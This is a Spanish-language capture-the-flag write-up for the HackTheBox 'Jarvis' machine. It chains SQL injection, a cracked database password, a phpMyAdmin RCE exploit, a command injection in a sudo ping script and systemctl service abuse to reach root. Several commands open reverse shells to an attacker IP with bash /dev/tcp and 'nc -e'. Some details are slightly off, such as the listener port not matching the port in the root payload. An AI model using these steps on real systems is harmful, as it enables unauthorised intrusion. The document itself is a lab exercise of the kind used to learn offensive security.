---
title: HackTheBox Jarvis
date: 2021-11-15 12:00:00 -0400
image: 
    src: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/jarvis.png
    height: 1100
    width: 500
categories: [HTB Writeups, Linux Medium]
tags: [web, sqli, systmctl, rce]
---


**Machine IP**: 10.10.10.143


### Reconocimiento
Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes
### Nmap 
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/nmap.png)

Como vemos tiene el puerto 80 abierto, que es el http,  veremos en el navegador de que se trata y analizaremos la web.

### Wappalyzer
Usando la extensión wappalizer para identificar las tecnologías usadas en la web, encontramos que la web está usando phpmyadmin version 4.8

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/wappa.png)


Al hacer un poco de research encontramos la siguiente vulnerabilidad [phpMyAdmin 4.8.1 - Remote Code Execution (RCE)](https://www.exploit-db.com/exploits/50457) , que se aprovecha del ejecutar comandos a traves de parametros sql.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/exploitdb.png)

Este exploit nos pide parametros como contraseña y usuario, pero aun no los tenemos, así que debemos encontrar una forma de encontrar esos credenciales.

Haciendo inspección a la pagina encontré una vulnerabilidad de sql injection en la siguiente url `http://10.10.10.143/room.php?cod=6`

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/sql.png)

Usando la plataforma crackstation pude encontrar la contraseña

`MYSQL5 2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou`


Con esto ya podemos hacer uso del exploit que encontramos en exploitdb con el usuario DBadmin y la password imissyou


```bash
python3 forest.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou "bash -c 'bash -i >& /dev/tcp/10.10.17.58/6968 0>&1' 
```

Antes de ejecutar el exploit establecmos un listener con netcat por el puerto 6968

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/wwwdata.png)

Obtenemos una shell como www-data


### Escalamiento de privilegios
Luego de obtener acceso a una Shell con el usuario www-data, buscamos que binarios puedes ser ejecutados como usuarios con privilegios.

```bash
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

Vemos que se puede ejecutar el script simpler.py como el usuario pepeer.
Leyendo el script nos damos cuenta que ejecuta el comando ping usando la libreria os, esto se logra llamando a ping desde python, pero al hacer esto se pueden ejecutar otros comandos al final de este.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/ping.png)

Como vemos está validando que no se usen los caracteres especiales, pero para bypassear eso podemos crearnos un archivo y poner dentro nuestro comando para ejecutarnos una reverse shell, quedaría asi:

```

www-data@jarvis:/tmp$
www-data@jarvis:/tmp$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.17.58 443' > /tmp/d.sh
www-data@jarvis:/tmp$ chmod +x /tmp/d.sh
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(/tmp/d.sh)
```

Obtenemos una shell como el usuario pepper y obtenemos el user.txt

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/usertxt.png)

Para escalar privilegios abusé del servicio systemctl que encontré buscando binarios con permisos suid.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/find.png)

Systemctl es un servicio se define mediante un archivo. Se utiliza para vincularlo a este , y luego se utiliza de nuevo para iniciar el servicio. Lo que hace el servicio está definido por el archivo.. servicesystemctlsystemd.service

Para explotar este servicio solo seguí los pasos que nos dá la gpina gtfo bins

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/gtfo.png)

Modificaré eso ligeramente para darme una reverse shell como usuario root.

```bash
cat priv.sh
#!/bin/bash
nc -e 10.10.17.58 444

echo '[Service]                               
Type=oneshot
ExecStart=/home/pepper/priv.sh
[Install]
WantedBy=multi-user.target' > esc.service

systemctl link /home/pepper/esc.service
systemctl enable --now /home/pepper/esc.service
```

```bash
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.17.58.
Ncat: Connection from 10.10.17.58:37160.
id
uid=0(root) gid=0(root) groups=0(root)
```

**Game over!
Obtenemos acceso root y el root.txt.**

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/jarvis/roottxt.png)
